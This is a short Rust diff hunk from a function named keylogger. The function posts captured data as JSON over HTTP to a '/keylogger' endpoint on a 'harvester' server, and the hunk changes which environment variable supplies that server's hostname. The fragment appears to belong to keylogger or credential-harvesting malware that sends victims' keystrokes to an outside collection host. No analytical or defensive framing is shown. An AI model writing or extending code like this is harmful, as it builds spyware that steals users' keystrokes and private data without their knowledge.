@@ -18,7 +18,7 @@ pub fn keylogger(reqwest_client: Client, global_state: AppState) {
                 let res = reqwest_client
                     .post(format!(
                         "http://{}:{}/keylogger",
-                        global_state.env_vars.public_harvester_dns,
+                        global_state.env_vars.harvester_dns,
                         global_state.env_vars.public_harvester_port
                     ))
                     .json::<Req>(&req)
